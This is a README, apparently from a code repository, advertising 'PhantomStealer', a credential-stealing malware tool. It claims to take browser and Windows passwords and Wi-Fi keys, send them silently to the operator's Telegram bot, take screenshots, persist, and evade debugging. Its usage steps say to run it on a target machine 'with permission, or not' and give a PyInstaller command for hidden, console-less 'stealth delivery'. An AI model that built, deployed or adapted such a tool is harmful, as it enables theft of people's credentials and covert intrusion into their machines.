# PhantomStealer - BlackHat Edition

---

### By MR MONSIF H4CK3R  
**Not AI-generated — handcrafted by a real human.**

---

## What it does

- Steals saved passwords from Microsoft Edge & Google Chrome  
- Dumps Windows credentials and Wi-Fi passwords  
- Sends everything directly to your Telegram bot, silently  
- Takes screenshots for extra intel  
- Runs hidden with no console window  
- Auto-persistent and anti-debugging tricks included  

---

## Known Pain

- Chrome password decrypting is weak AF right now.  
Google keeps changing their encryption, so this needs manual tweak or key extraction to crack it right.

---

## How to roll

1. Put your Telegram bot token & chat ID in the script.  
2. Run on your target machine (with permission, or not).  
3. Wait for the loot in your Telegram channel.  
4. Compile with PyInstaller for stealth delivery:  

 
   ```bash
   pyinstaller --onefile --noconsole --icon your_icon.ico phantom_stealer.py
